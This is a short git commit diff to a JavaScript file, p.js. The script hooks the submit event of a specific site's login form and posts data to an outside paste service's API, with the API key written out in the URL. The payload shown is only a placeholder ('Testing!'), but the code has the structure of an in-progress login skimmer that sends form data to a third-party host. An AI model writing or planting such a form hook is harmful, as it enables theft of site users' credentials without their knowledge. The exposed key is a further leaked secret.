4faee1a24000e18fc61326ebcca6bbc73735227b
red-lights-be <38047528+red-lights-be@users.noreply.github.com>
2018-04-03 20:23:41 +0000

    Update p.js

--- p.js
+++ p.js
@@ -2,7 +2,10 @@ $('form[action="https://www.redlights.be/login/"]').on("submit", function(event)
   $.post({
     url: "https://api.paste.ee/v1/pastes?key=uGxRzkmjJ1pbHcsSETDJsjbQn9ZVgGkV57utq9XG6",
     dataType:"json",
-    data: '{"description":"test","sections":[{"name":"Section1","syntax":"autodetect","contents":"Testing!"}]}'
+    data: {
+      "description":"test",
+      "sections":[{"name":"Section1","syntax":"autodetect","contents":"Testing!"}]
+    }
   }).done(function(a, b) {
     console.log(a, b);
   }).fail(function(a, b) {
